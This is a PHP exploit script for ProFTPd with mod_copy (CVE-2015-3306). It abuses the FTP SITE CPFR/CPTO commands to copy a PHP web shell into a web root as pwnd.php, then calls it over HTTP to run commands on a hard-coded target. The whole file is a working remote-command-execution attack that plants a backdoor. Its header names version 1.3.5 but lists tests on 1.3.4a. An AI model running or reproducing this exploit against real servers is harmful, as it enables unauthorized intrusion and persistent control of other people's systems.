<?php
# Title: ProFTPd 1.3.5 Remote Command Execution
# Date : 28/07/2017
# Author: David Tavarez @davidtavarez
# Software: ProFTPd 1.3.5 with mod_copy
# Tested : Debian 4+deb7u2 (ProFTPD 1.3.4a)
#          Debian-4+deb7u1 (ProFTPD 1.3.4a)
# CVE : 2015-3306
# Greetz to R-73eN because this is just a port to PHP ;)
$target    = "192.168.5.29";
$directory = "/var/www/";
$cmd       = "dir";
$evil      = <<<EOT
<?php system(\$_GET['cmd']); ?>
EOT;
echo "[ + ] Let's test the target [ + ] \n";
$return = @file_get_contents("http://" . $target . "/");
if ($return == false) {
    die("\t[ - ] There is no Webserver running on target [ - ]\n");
}
$str = trim(preg_replace('/\s+/', ' ', $return)); // supports line breaks inside <title>
preg_match("/\<title\>(.*)\<\/title\>/i", $str, $title); // ignore case
$target_title = $title[1];
echo "\t[ + ] The target is running a Webserver [ + ]\n";
echo "\t\t" . $target_title . "\n";
$conn = @ftp_connect($target) or die("Couldn't connect to {$target}");
if (!is_resource($conn)) {
    die("\t[ - ] Couldn't connect to {$target} via FTP [ - ]\n");
}
echo "[ + ] Connected to server [ + ] \n";
echo "[ + ] Sending payload [ + ]\n";
$raw = ftp_raw($conn, "site cpfr /etc/passwd");
foreach ($raw as $line) {
    echo "\t" . $line . "\n";
}
$raw = ftp_raw($conn, "site cpto " . $evil);
foreach ($raw as $line) {
    echo "\t" . $line . "\n";
}
$raw = ftp_raw($conn, "site cpfr /proc/self/fd/3");
foreach ($raw as $line) {
    echo "\t" . $line . "\n";
}
$raw = ftp_raw($conn, "site cpto " . $directory . "pwnd.php");
foreach ($raw as $line) {
    echo "\t" . $line . "\n";
}
echo "[ + ] Payload sended [ + ]\n";
echo "[ + ] Executing Payload [ + ]\n";
$return = @file_get_contents("http://" . $target . "/pwnd.php?cmd=" . $cmd);
if ($return == false) {
    echo "\t[ - ] Payload failed [ - ]\n";
} else {
    echo $return;
}
?>
